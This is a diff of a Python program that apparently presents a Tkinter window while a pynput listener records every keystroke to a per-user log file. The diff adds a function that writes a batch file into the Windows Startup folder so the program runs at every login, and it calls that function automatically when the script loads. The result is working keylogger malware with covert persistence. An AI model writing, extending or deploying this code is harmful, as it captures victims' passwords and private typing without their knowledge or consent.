@@ -1,11 +1,13 @@
 import pynput
 import logging
 import time
+import getpass
+import os
 from tkinter import *
 from tkinter import ttk
 from tkinter.messagebox import showinfo
 
-# TODO: set the program as startup
+USER_NAME = getpass.getuser()
 
 class App:
 
@@ -40,6 +42,25 @@ class App:
         else:
             showinfo(message='Done!')
 
+# Read every ket input and log it
+def on_press(key):
+    """Function to capture and log key presses."""
+    try:
+        logging.info(f"Key pressed: {key.char}")
+    except AttributeError:
+        logging.info(f"Special key pressed: {key}")
+
+# Adding the script to startup
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" "%s"' % file_path)
+
+# Adding the script to startup
+add_to_startup()
+
 # Create window 
 root = Tk()
 
@@ -56,18 +77,10 @@ app = App(root)
 root.mainloop()
 
 # Specify the file path where you want to store the logged keys
-log_file_path = "key_log.txt"
+log_file_path = f"{USER_NAME}_key_log.txt"
 
 # Configure logging to write to the specified file
 logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-# Read every ket input and log it
-def on_press(key):
-    """Function to capture and log key presses."""
-    try:
-        logging.info(f"Key pressed: {key.char}")
-    except AttributeError:
-        logging.info(f"Special key pressed: {key}")
 
 # Create a keyboard listener
 with pynput.keyboard.Listener(on_press=on_press) as listener:
